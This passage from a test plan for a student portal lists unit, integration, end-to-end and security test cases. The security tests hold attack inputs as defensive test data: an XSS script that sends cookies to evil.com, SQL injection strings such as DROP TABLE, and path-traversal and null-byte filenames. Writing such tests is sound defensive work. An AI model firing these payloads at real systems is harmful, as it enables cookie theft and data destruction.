    vi.mock('@/lib/auth', () => ({ auth: vi.fn().mockResolvedValue(null) }))
    const res = await GET(new Request('http://localhost/api/v1/announcements'))
    expect(res.status).toBe(401)
  })

  it('TC-5.2.2: returns paginated data with meta for student session', async () => {
    vi.mock('@/lib/auth', () => ({ auth: vi.fn().mockResolvedValue({ user: { id: 'u1', role: 'student' }}) }))
    const { GET } = await import('@/app/api/v1/announcements/route')
    const res = await GET(new Request('http://localhost/api/v1/announcements?page=1&limit=10'))
    const json = await res.json()
    expect(json.success).toBe(true)
    expect(json.data.length).toBeLessThanOrEqual(10)
    expect(json.meta).toHaveProperty('total')
  })

  it('TC-5.2.3: page 2 returns different results than page 1', async () => {
    vi.mock('@/lib/auth', () => ({ auth: vi.fn().mockResolvedValue({ user: { id: 'u1', role: 'student' }}) }))
    const { GET } = await import('@/app/api/v1/announcements/route')
    const r1 = await (await GET(new Request('http://localhost/api/v1/announcements?page=1&limit=5'))).json()
    const r2 = await (await GET(new Request('http://localhost/api/v1/announcements?page=2&limit=5'))).json()
    expect(r1.data[0].id).not.toBe(r2.data[0].id)
  })

  it('TC-5.2.4: invalid page param returns 400', async () => {
    vi.mock('@/lib/auth', () => ({ auth: vi.fn().mockResolvedValue({ user: { id: 'u1', role: 'student' }}) }))
    const { GET } = await import('@/app/api/v1/announcements/route')
    const res = await GET(new Request('http://localhost/api/v1/announcements?page=abc'))
    expect(res.status).toBe(400)
  })

  it('TC-5.2.5: only published announcements are returned to students', async () => {
    const user = await prisma.user.findFirst({ where: { role: 'super_admin' }})
    await prisma.announcement.create({ data: { title: 'Draft', body: '<p>x</p>', type: 'general', isPublished: false, authorId: user!.id }})
    vi.mock('@/lib/auth', () => ({ auth: vi.fn().mockResolvedValue({ user: { id: 'u1', role: 'student' }}) }))
    const { GET } = await import('@/app/api/v1/announcements/route')
    const res = await GET(new Request('http://localhost/api/v1/announcements'))
    const json = await res.json()
    const titles = json.data.map((a: any) => a.title)
    expect(titles).not.toContain('Draft')
  })
})
```

**Expected:** All 5 pass. Drafts are invisible to students; pagination is correct.

---

### 5.3 — Poll Voting — One Vote Per User
**Tool:** Vitest + test DB

```typescript
describe('POST /api/v1/polls/:id/vote', () => {
  it('TC-5.3.1: student can vote on an active poll', async () => {
    // Setup: create poll in DB, mock student session
    // POST { optionIndex: 0 }
    // Expected: 200, vote recorded
  })

  it('TC-5.3.2: same student cannot vote twice (returns 409 Conflict)', async () => {
    // Vote once → vote again → expect 409
  })

  it('TC-5.3.3: voting on closed poll returns 400', async () => {
    // Create poll with isClosed: true
    // POST vote → expect 400
  })

  it('TC-5.3.4: invalid optionIndex (out of bounds) returns 400', async () => {
    // Poll has 3 options, submit optionIndex: 99
    // Expected: 400
  })

  it('TC-5.3.5: unauthenticated vote attempt returns 401', async () => {
    // No session cookie
    // Expected: 401
  })

  it('TC-5.3.6: optionIndex -1 (negative) returns 400', async () => {
    // Boundary check
  })
})
```

---

### 5.4 — AI Chatbot Route
**Tool:** Vitest + mocked Gemini

```typescript
describe('POST /api/v1/chat', () => {
  it('TC-5.4.1: returns streaming response for valid question', async () => {
    // Mock: getEmbedding() → vector, searchKnowledge() → chunks, Gemini → stream
    // Expected: 200, Content-Type: text/event-stream
  })

  it('TC-5.4.2: returns 429 when user exceeds 20 queries/hour', async () => {
    // Mock rateLimit to return success: false
    // Expected: 429 with RATE_LIMITED code
  })

  it('TC-5.4.3: empty question body returns 400', async () => {
    // POST { question: '' }
    // Expected: 400
  })

  it('TC-5.4.4: question longer than 500 chars returns 400', async () => {
    // POST { question: 'x'.repeat(501) }
    // Expected: 400
  })

  it('TC-5.4.5: logs question and answer to chat_logs table', async () => {
    // After a successful chat request, assert prisma.chatLog.findFirst() is non-null
  })

  it('TC-5.4.6: when Gemini global rate limit is hit, returns 503', async () => {
    // Mock geminiRateCheck → false
    // Expected: 503 with "AI temporarily busy" message
  })
})
```

---

## 6. API Integration Tests — Admin Routes

### 6.1 — Announcement CRUD (Admin)
**Tool:** Vitest + test DB

```typescript
describe('Admin Announcements API', () => {
  it('TC-6.1.1: admin can create announcement — returns 201 with ID', async () => {
    // POST /api/v1/admin/announcements
    // Body: { title, body, type: 'general' }
    // Expected: 201, json.data.id exists
  })

  it('TC-6.1.2: created announcement appears in student-facing list', async () => {
    // Create via admin → fetch as student → should appear
  })

  it('TC-6.1.3: admin can edit own announcement', async () => {
    // Create → PATCH with updated title → verify new title in DB
  })

  it('TC-6.1.4: admin cannot edit another admin\'s announcement (403)', async () => {
    // Admin A creates → Admin B tries PATCH → 403
  })

  it('TC-6.1.5: admin cannot delete announcements (403 — super_admin only)', async () => {
    // Admin sends DELETE → 403
  })

  it('TC-6.1.6: super_admin can delete any announcement', async () => {
    // Create → super_admin sends DELETE → 200, record gone from DB
  })

  it('TC-6.1.7: announcement body is sanitized before storage (XSS prevention)', async () => {
    // POST body: '<script>evil()</script><p>real content</p>'
    // After creation, fetch from DB → body should not contain <script>
  })

  it('TC-6.1.8: audit log entry created on announcement creation', async () => {
    // After CREATE, query audit_logs → at least one row with action: 'CREATE', targetType: 'announcement'
  })

  it('TC-6.1.9: student role cannot access POST /api/v1/admin/announcements (403)', async () => {
    // Mock student session → POST → 403
  })
})
```

---

### 6.2 — File Upload (Admin)
**Tool:** Vitest + mocked Google Drive API

```typescript
describe('POST /api/v1/admin/files', () => {
  it('TC-6.2.1: valid PDF upload returns 201 with driveUrl', async () => {
    // Mock Drive API upload → fake driveId, driveUrl
    // POST multipart with a PDF buffer
    // Expected: 201
  })

  it('TC-6.2.2: file larger than 25MB returns 413', async () => {
    // Create a 26MB buffer and submit
    // Expected: 413
  })

  it('TC-6.2.3: disallowed MIME type (e.g., .exe) returns 400', async () => {
    // POST a file with MIME type application/x-msdownload
    // Expected: 400
  })

  it('TC-6.2.4: filename is sanitized (path traversal attempt)', async () => {
    // POST file with name: '../../etc/passwd.pdf'
    // Expected: stored filename does NOT contain '..'
  })

  it('TC-6.2.5: file record inserted in file_uploads table', async () => {
    // After upload, prisma.fileUpload.findFirst() by driveId → not null
  })

  it('TC-6.2.6: student cannot upload files (403)', async () => {
    // Mock student session → POST → 403
  })
})
```

---

### 6.3 — User Role Management (Super Admin Only)
**Tool:** Vitest + test DB

```typescript
describe('PATCH /api/v1/admin/users/:id/role', () => {
  it('TC-6.3.1: super_admin can promote student to admin', async () => {
    // Create student user → PATCH role: 'admin' → 200, DB role updated
  })

  it('TC-6.3.2: super_admin cannot promote to super_admin via API (only SQL)', async () => {
    // PATCH role: 'super_admin' → 400 (blocked)
  })

  it('TC-6.3.3: admin cannot change any user role (403)', async () => {
    // Admin session → PATCH → 403
  })

  it('TC-6.3.4: student cannot change any user role (403)', async () => {
    // Student session → PATCH → 403
  })

  it('TC-6.3.5: role change is logged in audit_logs', async () => {
    // After PATCH, audit_logs should have action: 'ROLE_CHANGE'
  })

  it('TC-6.3.6: changing role of non-existent user returns 404', async () => {
    // PATCH /api/v1/admin/users/fake-uuid/role → 404
  })
})
```

---

## 7. API Integration Tests — Internal Routes

### 7.1 — Internal Secret Header
**Tool:** Vitest

```typescript
describe('POST /api/v1/internal/announcements', () => {
  it('TC-7.1.1: request without X-Internal-Secret returns 401', async () => {
    const req = new Request('http://localhost/api/v1/internal/announcements', { method: 'POST' })
    const { POST } = await import('@/app/api/v1/internal/announcements/route')
    const res = await POST(req)
    expect(res.status).toBe(401)
  })

  it('TC-7.1.2: request with wrong secret returns 401', async () => {
    const req = new Request('http://localhost/api/v1/internal/announcements', {
      method: 'POST',
      headers: { 'x-internal-secret': 'wrong-secret' },
      body: JSON.stringify({ title: 'Test', body: 'body', type: 'general' }),
    })
    const { POST } = await import('@/app/api/v1/internal/announcements/route')
    const res = await POST(req)
    expect(res.status).toBe(401)
  })

  it('TC-7.1.3: valid secret with valid body creates announcement and returns 201', async () => {
    process.env.INTERNAL_API_SECRET = 'test-secret'
    const req = new Request('http://localhost/api/v1/internal/announcements', {
      method: 'POST',
      headers: { 'x-internal-secret': 'test-secret', 'Content-Type': 'application/json' },
      body: JSON.stringify({ title: 'n8n Post', body: '<p>From n8n</p>', type: 'general' }),
    })
    const { POST } = await import('@/app/api/v1/internal/announcements/route')
    const res = await POST(req)
    expect(res.status).toBe(201)
  })

  it('TC-7.1.4: internal route creates FCM notification for all push token holders', async () => {
    // After POST, verify FCM was called (mock firebase-admin)
    // Mock sendMulticast → assert it was called with correct tokens
  })

  it('TC-7.1.5: malformed JSON body returns 400', async () => {
    process.env.INTERNAL_API_SECRET = 'test-secret'
    const req = new Request('http://localhost/api/v1/internal/announcements', {
      method: 'POST',
      headers: { 'x-internal-secret': 'test-secret', 'Content-Type': 'application/json' },
      body: '{bad json}',
    })
    const { POST } = await import('@/app/api/v1/internal/announcements/route')
    const res = await POST(req)
    expect(res.status).toBe(400)
  })
})
```

**Expected:** Internal endpoints are completely locked. n8n can post; anyone else cannot.

---

## 8. Database & Schema Tests

### 8.1 — Database Constraints
**Tool:** Vitest + Prisma + test DB (raw SQL)

```typescript
describe('Database constraints', () => {
  it('TC-8.1.1: users.email UNIQUE constraint prevents duplicate emails', async () => {
    await prisma.user.create({ data: { email: 'dup@iut-dhaka.edu', name: 'A', role: 'student' }})
    await expect(
      prisma.user.create({ data: { email: 'dup@iut-dhaka.edu', name: 'B', role: 'student' }})
    ).rejects.toThrow()
  })

  it('TC-8.1.2: poll_votes [pollId, userId] UNIQUE prevents double voting', async () => {
    const user = await prisma.user.create({ data: { email: 'voter@iut-dhaka.edu', name: 'V', role: 'student' }})
    const poll = await prisma.poll.create({ data: { question: 'Q?', options: ['A', 'B'], createdById: user.id }})
    await prisma.pollVote.create({ data: { pollId: poll.id, userId: user.id, optionIndex: 0 }})
    await expect(
      prisma.pollVote.create({ data: { pollId: poll.id, userId: user.id, optionIndex: 1 }})
    ).rejects.toThrow()
  })

  it('TC-8.1.3: CASCADE DELETE removes child rows when parent is deleted', async () => {
    const user = await prisma.user.create({ data: { email: 'cascade@iut-dhaka.edu', name: 'C', role: 'student' }})
    await prisma.notification.create({ data: { userId: user.id, title: 'T', body: 'B' }})
    await prisma.user.delete({ where: { id: user.id }})
    const notif = await prisma.notification.findFirst({ where: { userId: user.id }})
    expect(notif).toBeNull()
  })

  it('TC-8.1.4: knowledge_chunks CASCADE DELETE when document deleted', async () => {
    const doc = await prisma.knowledgeDocument.create({ data: { title: 'T', sourceType: 'faq', content: 'x' }})
    await prisma.$executeRaw`INSERT INTO knowledge_chunks (id, document_id, chunk_index, content) VALUES (uuid_generate_v4(), ${doc.id}::uuid, 0, 'chunk')`
    await prisma.knowledgeDocument.delete({ where: { id: doc.id }})
    const chunks = await prisma.$queryRaw`SELECT * FROM knowledge_chunks WHERE document_id = ${doc.id}::uuid`
    expect((chunks as any[]).length).toBe(0)
  })

  it('TC-8.1.5: push_tokens.token UNIQUE constraint is enforced', async () => {
    const user = await prisma.user.create({ data: { email: 'push@iut-dhaka.edu', name: 'P', role: 'student' }})
    await prisma.pushToken.create({ data: { userId: user.id, token: 'fcm-token-abc' }})
    await expect(
      prisma.pushToken.create({ data: { userId: user.id, token: 'fcm-token-abc' }})
    ).rejects.toThrow()
  })

  it('TC-8.1.6: user role defaults to student on creation', async () => {
    const user = await prisma.user.create({ data: { email: 'default@iut-dhaka.edu', name: 'D' }})
    expect(user.role).toBe('student')
  })
})
```

---

### 8.2 — pgvector Similarity Search
**Tool:** Vitest + test DB (requires pgvector extension)

```typescript
describe('pgvector similarity search', () => {
  it('TC-8.2.1: returns top-K chunks by cosine similarity', async () => {
    // Insert 10 chunks with known embeddings
    // Run searchKnowledge with a query embedding close to chunk #3
    // Expected: chunk #3 appears in top 5 results
  })

  it('TC-8.2.2: filters out chunks with similarity below 0.55 threshold', async () => {
    // Insert chunk with near-zero similarity to query
    // Run search → chunk should NOT appear in results
  })

  it('TC-8.2.3: returns empty array when knowledge_chunks table is empty', async () => {
    const results = await searchKnowledge(new Array(384).fill(0), 5)
    expect(results).toEqual([])
  })

  it('TC-8.2.4: embedding vector must be 384 dimensions (rejects wrong size)', async () => {
    await expect(
      prisma.$executeRaw`INSERT INTO knowledge_chunks (id, document_id, chunk_index, content, embedding) VALUES (uuid_generate_v4(), ${docId}::uuid, 0, 'test', ${[0.1, 0.2]}::vector)`
    ).rejects.toThrow() // Wrong dimension
  })
})
```

---

## 9. Automation Pipeline Tests

### 9.1 — n8n Webhook Payload Processing
**Tool:** Jest/Vitest (HTTP mock)

```typescript
describe('n8n pipeline — text announcement', () => {
  it('TC-9.1.1: text payload from Telegram reaches n8n webhook', async () => {
    // POST to http://n8n:5678/webhook/telegram-incoming
    // Body: { type: 'text', content: 'Exam on Friday', chatId: 12345 }
    // Expected: 200 from n8n, workflow execution starts
  })

  it('TC-9.1.2: voice payload triggers transcription then classification', async () => {
    // POST with { type: 'voice', audioBase64: base64audio, chatId: 12345 }
    // Mock transcriber → returns transcript
    // Mock Gemini → returns classified JSON
    // Expected: preview sent back to chatId
  })

  it('TC-9.1.3: Gemini classification output is valid JSON', async () => {
    // Mock Gemini response: '{ "type": "exam", "title": "Mid Term", "body": "...", "urgency": "high" }'
    // Parse in Code node → no JSON.parse error
    // Expected: type, title, body, urgency fields all present
  })

  it('TC-9.1.4: "yes" approval triggers all 3 platform posts (website + Discord + WhatsApp)', async () => {
    // Mock all 3 HTTP endpoints
    // Simulate CR replying "yes"
    // Expected: all 3 POST requests received with correct payloads
  })

  it('TC-9.1.5: "no" approval cancels pipeline without posting anything', async () => {
    // Simulate CR replying "no"
    // Expected: none of the 3 platform endpoints are called
  })

  it('TC-9.1.6: unauthorized Telegram chat ID is silently ignored', async () => {
    // Send payload with chatId NOT in AUTHORIZED_CHAT_IDS
    // Expected: Telegraf bot returns early, n8n never receives the payload
  })

  it('TC-9.1.7: n8n wait node times out after 30 min without CR reply', async () => {
    // Verify workflow definition has 30-min timeout on Wait node
    // Expected: workflow execution fails gracefully, no zombie processes
  })
})
```

---

### 9.2 — Transcriber Service (Python FastAPI)
**Tool:** pytest (Python) OR curl scripts

```bash
# TC-9.2.1: Health check
curl -f http://localhost:8000/health
# Expected: {"status":"ok"}

# TC-9.2.2: Valid OGG audio returns transcript
# Generate a 5-second silence OGG with ffmpeg
ffmpeg -f lavfi -i anullsrc -t 5 -c:a libvorbis /tmp/test.ogg
AUDIO_B64=$(base64 -w0 /tmp/test.ogg)
curl -X POST http://localhost:8000/transcribe \
  -H "Content-Type: application/json" \
  -d "{\"audio_base64\":\"$AUDIO_B64\",\"filename\":\"test.ogg\"}"
# Expected: { "transcript": "...", "language": "en", "duration": ... }

# TC-9.2.3: Empty audio_base64 returns 422 (FastAPI validation error)
curl -X POST http://localhost:8000/transcribe \
  -H "Content-Type: application/json" \
  -d '{"audio_base64":"","filename":"test.ogg"}'
# Expected: 422 Unprocessable Entity

# TC-9.2.4: Embed endpoint returns 384-dim vector
curl -X POST http://localhost:8000/embed \
  -H "Content-Type: application/json" \
  -d '{"text":"What is the exam date?"}'
# Expected: { "embedding": [...384 floats...], "dimensions": 384 }

# TC-9.2.5: Embed endpoint rejects text shorter than 2 chars
curl -X POST http://localhost:8000/embed \
  -H "Content-Type: application/json" \
  -d '{"text":"a"}'
# Expected: 400

# TC-9.2.6: Models must be pre-loaded (response time < 1s, no cold-start delay)
time curl -X POST http://localhost:8000/embed -H "Content-Type: application/json" -d '{"text":"test"}'
# Expected: real time < 1.0s
```

---

## 10. Bot Service Tests

### 10.1 — WhatsApp Bot HTTP Server
**Tool:** curl / supertest

```bash
# TC-10.1.1: /health returns connection status
curl http://localhost:3002/health
# Expected: { "connected": true } (after QR scan)

# TC-10.1.2: /send without secret returns 401
curl -X POST http://localhost:3002/send \
  -H "Content-Type: application/json" \
  -d '{"message":"test"}'
# Expected: 401 Unauthorized

# TC-10.1.3: /send with valid secret posts to WhatsApp group
curl -X POST http://localhost:3002/send \
  -H "Content-Type: application/json" \
  -H "x-internal-secret: $INTERNAL_API_SECRET" \
  -d '{"message":"[TEST] Health check message"}'
# Expected: { "success": true }, message appears in WhatsApp group

# TC-10.1.4: /send with message > 4096 chars is truncated (not error)
LONG_MSG=$(python3 -c "print('A'*5000)")
curl -X POST http://localhost:3002/send \
  -H "Content-Type: application/json" \
  -H "x-internal-secret: $INTERNAL_API_SECRET" \
  -d "{\"message\":\"$LONG_MSG\"}"
# Expected: 200, message sent (truncated to 4096 chars)

# TC-10.1.5: /send when WhatsApp is not connected returns 503
# (Test by stopping WhatsApp session without restarting service)
# Expected: 503 Service Unavailable with "not connected" message

# TC-10.1.6: missing message field returns 400
curl -X POST http://localhost:3002/send \
  -H "x-internal-secret: $INTERNAL_API_SECRET" \
  -H "Content-Type: application/json" \
  -d '{}'
# Expected: 400 with error message
```

---

### 10.2 — Discord Bot HTTP Server
**Tool:** curl

```bash
# TC-10.2.1: /health returns { connected: true } when bot is logged in
curl http://localhost:3003/health
# Expected: { "connected": true }

# TC-10.2.2: /announce without secret returns 401
curl -X POST http://localhost:3003/announce \
  -H "Content-Type: application/json" \
  -d '{"title":"Test","body":"Body","type":"general"}'
# Expected: 401

# TC-10.2.3: /announce with valid payload sends Discord embed
curl -X POST http://localhost:3003/announce \
  -H "Content-Type: application/json" \
  -H "x-internal-secret: $INTERNAL_API_SECRET" \
  -d '{"title":"[TEST] CI Announcement","body":"This is a test.","type":"general"}'
# Expected: 200, embed appears in Discord #announcements channel

# TC-10.2.4: title is clamped to 256 chars (Discord embed limit)
LONG_TITLE=$(python3 -c "print('T'*300)")
# Submit with 300-char title — expected: 200, embed title truncated to 256

# TC-10.2.5: body is clamped to 4096 chars (Discord embed description limit)
# Similar to above, 5000-char body should be truncated

# TC-10.2.6: exam type maps to red embed color (0xef4444)
# Post with type: 'exam' → verify embed color in Discord
```

---

## 11. End-to-End Tests — Critical User Journeys

### Setup for Playwright
**File:** `playwright.config.ts`

```typescript
import { defineConfig, devices } from '@playwright/test'

export default defineConfig({
  testDir: './e2e',
  fullyParallel: false,
  use: {
    baseURL: 'http://localhost:3000',
    trace: 'on-first-retry',
    screenshot: 'only-on-failure',
  },
  projects: [
    { name: 'Desktop Chrome', use: { ...devices['Desktop Chrome'] } },
    { name: 'Mobile Chrome', use: { ...devices['Pixel 5'] } },
    { name: 'Desktop Firefox', use: { ...devices['Desktop Firefox'] } },
  ],
})
```

---

### 11.1 — Authentication Journeys
**File:** `e2e/auth.spec.ts`

```typescript
import { test, expect } from '@playwright/test'

test('TC-11.1.1: Login page renders Google sign-in button', async ({ page }) => {
  await page.goto('/login')
  await expect(page.getByText('Sign in with Google')).toBeVisible()
  await expect(page.getByText('@iut-dhaka.edu')).toBeVisible()
})

test('TC-11.1.2: Authenticated user visiting /login is redirected to /dashboard', async ({ page }) => {
  // Inject student session cookie (from saved auth state)
  await page.goto('/login')
  await expect(page).toHaveURL(/\/dashboard/)
})

test('TC-11.1.3: Unauthenticated user visiting /dashboard is redirected to /login', async ({ page }) => {
  await page.goto('/dashboard')
  await expect(page).toHaveURL(/\/login/)
})

test('TC-11.1.4: Unauthenticated user visiting /admin is redirected to /login', async ({ page }) => {
  await page.goto('/admin')
  await expect(page).toHaveURL(/\/login/)
})

test('TC-11.1.5: Student visiting /admin after login is redirected to /dashboard', async ({ page }) => {
  // Use student auth state
  await page.goto('/admin')
  await expect(page).toHaveURL(/\/dashboard/)
})

test('TC-11.1.6: Error page for non-IUT email shows correct message', async ({ page }) => {
  await page.goto('/auth/error?reason=domain')
  await expect(page.getByText(/@iut-dhaka\.edu/)).toBeVisible()
  await expect(page.getByRole('link', { name: /back to login/i })).toBeVisible()
})

test('TC-11.1.7: Error page for non-whitelisted email shows roster message', async ({ page }) => {
  await page.goto('/auth/error?reason=not-whitelisted')
  await expect(page.getByText(/roster/i)).toBeVisible()
})

test('TC-11.1.8: Sign out clears session and redirects to /login', async ({ page }) => {
  // Use student auth state
  await page.goto('/dashboard')
  await page.getByRole('button', { name: /sign out/i }).click()
  await expect(page).toHaveURL(/\/login/)
  // Verify session is truly gone
  await page.goto('/dashboard')
  await expect(page).toHaveURL(/\/login/)
})
```

---

### 11.2 — Student Dashboard Journeys
**File:** `e2e/student.spec.ts`

```typescript
test('TC-11.2.1: Dashboard renders all 4 core sections', async ({ page }) => {
  await page.goto('/dashboard')
  await expect(page.getByText(/latest announcements/i)).toBeVisible()
  await expect(page.getByText(/today.s routine/i)).toBeVisible()
  await expect(page.getByText(/upcoming exams/i)).toBeVisible()
})

test('TC-11.2.2: Clicking an announcement card opens full detail view', async ({ page }) => {
  await page.goto('/dashboard')
  const firstCard = page.locator('[data-testid="announcement-card"]').first()
  await firstCard.click()
  await expect(page).toHaveURL(/\/announcements\//)
})

test('TC-11.2.3: Resource library loads and shows files', async ({ page }) => {
  await page.goto('/resources')
  await expect(page.getByText(/resources/i)).toBeVisible()
  await expect(page.locator('[data-testid="file-card"]').first()).toBeVisible({ timeout: 5000 })
})

test('TC-11.2.4: Student can view exam schedule with countdown timers', async ({ page }) => {
  await page.goto('/exams')
  await expect(page.locator('[data-testid="exam-card"]').first()).toBeVisible()
  await expect(page.getByText(/days/i)).toBeVisible()
})

test('TC-11.2.5: Student can vote in an active poll and cannot vote again', async ({ page }) => {
  await page.goto('/polls')
  const pollCard = page.locator('[data-testid="poll-card"]').first()
  await pollCard.locator('button').first().click()
  // After voting, buttons should be disabled
  const buttons = pollCard.locator('button')
  await expect(buttons.first()).toBeDisabled()
})

test('TC-11.2.6: Student profile page is editable (phone, bio only)', async ({ page }) => {
  await page.goto('/profile')
  await expect(page.getByLabel(/phone/i)).toBeEditable()
  await expect(page.getByLabel(/bio/i)).toBeEditable()
  // role field should not be visible or editable
  await expect(page.getByLabel(/role/i)).not.toBeVisible()
})

test('TC-11.2.7: Chatbot page loads and shows input', async ({ page }) => {
  await page.goto('/chat')
  await expect(page.getByPlaceholder(/ask/i)).toBeVisible()
})

test('TC-11.2.8: Chatbot responds to a question without error', async ({ page }) => {
  await page.goto('/chat')
  await page.getByPlaceholder(/ask/i).fill('What is the attendance policy?')
  await page.keyboard.press('Enter')
  await expect(page.locator('.message-assistant').last()).not.toBeEmpty({ timeout: 20000 })
})
```

---

### 11.3 — Admin Panel Journeys
**File:** `e2e/admin.spec.ts` (using admin auth state)

```typescript
test('TC-11.3.1: Admin dashboard loads with activity overview', async ({ page }) => {
  await page.goto('/admin')
  await expect(page.getByText(/admin/i)).toBeVisible()
  await expect(page.getByText(/announcements/i)).toBeVisible()
})

test('TC-11.3.2: Admin can create a new announcement end-to-end', async ({ page }) => {
  await page.goto('/admin/announcements/new')
  await page.getByLabel(/title/i).fill('E2E Test Announcement')
  // TipTap body — click and type
  await page.locator('.tiptap').click()
  await page.keyboard.type('This is an E2E test announcement body.')
  await page.getByRole('button', { name: /publish/i }).click()
  await expect(page.getByText(/published/i)).toBeVisible({ timeout: 5000 })
})

test('TC-11.3.3: Newly created announcement appears in student announcement list', async ({ page }) => {
  // Use student auth state
  await page.goto('/announcements')
  await expect(page.getByText('E2E Test Announcement')).toBeVisible()
})

test('TC-11.3.4: Admin can upload a file to the resource library', async ({ page }) => {
  await page.goto('/admin/files')
  const fileInput = page.locator('input[type="file"]')
  await fileInput.setInputFiles({ name: 'test.pdf', mimeType: 'application/pdf', buffer: Buffer.from('PDF content') })
  await page.getByRole('button', { name: /upload/i }).click()
  await expect(page.getByText(/uploaded/i)).toBeVisible({ timeout: 10000 })
})

test('TC-11.3.5: Admin sees audit log entries for their actions', async ({ page }) => {
  await page.goto('/admin/audit-log')
  await expect(page.locator('[data-testid="audit-entry"]').first()).toBeVisible()
})

test('TC-11.3.6: Admin cannot access /admin/users page (super_admin only)', async ({ page }) => {
  // Using admin (not super_admin) auth state
  await page.goto('/admin/users')
  await expect(page).not.toHaveURL(/\/admin\/users/)
})
```

---

### 11.4 — Mobile Responsiveness
**File:** `e2e/mobile.spec.ts` — Run with `Pixel 5` project

```typescript
test('TC-11.4.1: Login page renders correctly on mobile viewport', async ({ page }) => {
  await page.goto('/login')
  await expect(page.getByText('Sign in with Google')).toBeVisible()
  // No horizontal scroll
  const scrollWidth = await page.evaluate(() => document.body.scrollWidth)
  const clientWidth = await page.evaluate(() => document.body.clientWidth)
  expect(scrollWidth).toBeLessThanOrEqual(clientWidth + 5) // 5px tolerance
})

test('TC-11.4.2: Dashboard is usable on mobile (nav, cards visible)', async ({ page }) => {
  await page.goto('/dashboard')
  await expect(page.locator('[data-testid="announcement-card"]').first()).toBeVisible()
})

test('TC-11.4.3: Admin panel is accessible on mobile', async ({ page }) => {
  await page.goto('/admin')
  await expect(page.locator('nav')).toBeVisible()
})
```

---

## 12. Security Tests — Injection & XSS

### 12.1 — SQL Injection via Query Parameters
**Tool:** curl

```bash
# TC-12.1.1: SQL injection in ?page parameter
curl -s "https://your-domain.me/api/v1/announcements?page=1';DROP TABLE announcements;--" \
  -H "Cookie: $STUDENT_COOKIE"
# Expected: 400 (Zod rejects non-integer), NOT 500 or SQL error

# TC-12.1.2: SQL injection in ?course_id filter
curl -s "https://your-domain.me/api/v1/files?course_id=1' OR '1'='1" \
  -H "Cookie: $STUDENT_COOKIE"
# Expected: 400 (UUID validation fails), no data leak

# TC-12.1.3: SQL injection in announcement search
curl -s "https://your-domain.me/api/v1/announcements?q=test' UNION SELECT * FROM users--" \
  -H "Cookie: $STUDENT_COOKIE"
# Expected: 400 or empty results, no user data returned

# TC-12.1.4: pgvector raw query — verify parameterized
# This is a code review test: grep for $queryRawUnsafe in codebase
grep -r "queryRawUnsafe" apps/web/src/
# Expected: ZERO occurrences
```

---

### 12.2 — XSS via Announcement Body
**Tool:** curl + browser

```bash
# TC-12.2.1: Submit XSS payload via admin announcement creation
curl -X POST https://your-domain.me/api/v1/admin/announcements \
  -H "Content-Type: application/json" \
  -H "Cookie: $ADMIN_COOKIE" \
  -d '{"title":"XSS Test","body":"<script>document.location=\"https://evil.com?c=\"+document.cookie</script><p>Safe</p>","type":"general"}'

# Then fetch the announcement body from DB directly:
docker exec ipe24-postgres psql -U ipe24 ipe24_db -c "SELECT body FROM announcements WHERE title='XSS Test'"
# Expected: body should NOT contain <script>

# TC-12.2.2: Check rendered announcement in browser does not execute script
# Using Playwright:
# 1. Create announcement with XSS body
# 2. Visit the announcement page as a student
# 3. Assert no alert dialog appeared and document.cookie was not sent
```

```typescript
// Playwright test for XSS execution prevention
test('TC-12.2.3: XSS payload in announcement body is not executed in browser', async ({ page }) => {
  let xssExecuted = false
  page.on('dialog', () => { xssExecuted = true })
  
  await page.goto('/announcements/xss-test-id')
  await page.waitForLoadState('networkidle')
  expect(xssExecuted).toBe(false)
})

test('TC-12.2.4: CSP header prevents inline script execution', async ({ page }) => {
  const response = await page.goto('/dashboard')
  const csp = response?.headers()['content-security-policy']
  expect(csp).toBeDefined()
  expect(csp).toMatch(/script-src/)
})
```

---

### 12.3 — CSRF Protection
**Tool:** curl

```bash
# TC-12.3.1: POST from wrong Origin header is rejected
curl -X POST https://your-domain.me/api/v1/polls/poll-id/vote \
  -H "Origin: https://evil.com" \
  -H "Content-Type: application/json" \
  -H "Cookie: $STUDENT_COOKIE" \
  -d '{"optionIndex": 0}'
# Expected: 403 (Origin mismatch)

# TC-12.3.2: POST without Origin header still works (same-origin browser request)
curl -X POST https://your-domain.me/api/v1/polls/poll-id/vote \
  -H "Content-Type: application/json" \
  -H "Cookie: $STUDENT_COOKIE" \
  -d '{"optionIndex": 0}'
# Expected: 200 (legitimate same-origin)
```

---

### 12.4 — Path Traversal via File Upload
**Tool:** curl

```bash
# TC-12.4.1: filename with path traversal sequence
curl -X POST https://your-domain.me/api/v1/admin/files \
  -H "Cookie: $ADMIN_COOKIE" \
  -F "file=@/tmp/test.pdf;filename=../../etc/passwd.pdf"
# Expected: 200 (upload succeeds) BUT stored filename does not contain '..' or '/'

# TC-12.4.2: filename with null byte
curl -X POST https://your-domain.me/api/v1/admin/files \
  -H "Cookie: $ADMIN_COOKIE" \
  -F "file=@/tmp/test.pdf;filename=evil%00.pdf"
# Expected: filename stored without null byte

# TC-12.4.3: Verify no voice note temp files persist after transcription
# After sending a voice note through n8n pipeline:
docker exec ipe24-web ls /tmp/*.ogg 2>&1
# Expected: "No such file or directory" — temp files are deleted
```

---

## 13. Security Tests — Auth Bypass & IDOR

### 13.1 — Role Escalation Attempts
**Tool:** curl

```bash
# TC-13.1.1: Student tries to escalate own role via profile PATCH
curl -X PATCH https://your-domain.me/api/v1/profile \
  -H "Content-Type: application/json" \
  -H "Cookie: $STUDENT_COOKIE" \
  -d '{"role":"super_admin","phone":"01711111111"}'
# Expected: 200 (phone updated), but role in DB is STILL 'student'

# TC-13.1.2: Student tries to access admin announcement creation endpoint
curl -X POST https://your-domain.me/api/v1/admin/announcements \
  -H "Content-Type: application/json" \
  -H "Cookie: $STUDENT_COOKIE" \
  -d '{"title":"Fake","body":"body","type":"general"}'
# Expected: 403 Forbidden

# TC-13.1.3: Admin tries to promote themselves to super_admin via API
curl -X PATCH https://your-domain.me/api/v1/admin/users/$ADMIN_USER_ID/role \
  -H "Content-Type: application/json" \
  -H "Cookie: $ADMIN_COOKIE" \
  -d '{"role":"super_admin"}'
# Expected: 403 Forbidden (only super_admin can change roles)

# TC-13.1.4: Admin tries to set role to super_admin for another user
curl -X PATCH https://your-domain.me/api/v1/admin/users/$TARGET_USER_ID/role \
  -H "Content-Type: application/json" \
  -H "Cookie: $SUPER_ADMIN_COOKIE" \
  -d '{"role":"super_admin"}'
# Expected: 400 (super_admin role not assignable via UI, blocked by Zod schema)
```

---

### 13.2 — IDOR — Accessing Other Users' Data
**Tool:** curl

```bash
# TC-13.2.1: Student A tries to access Student B's chat logs
STUDENT_A_COOKIE="..."
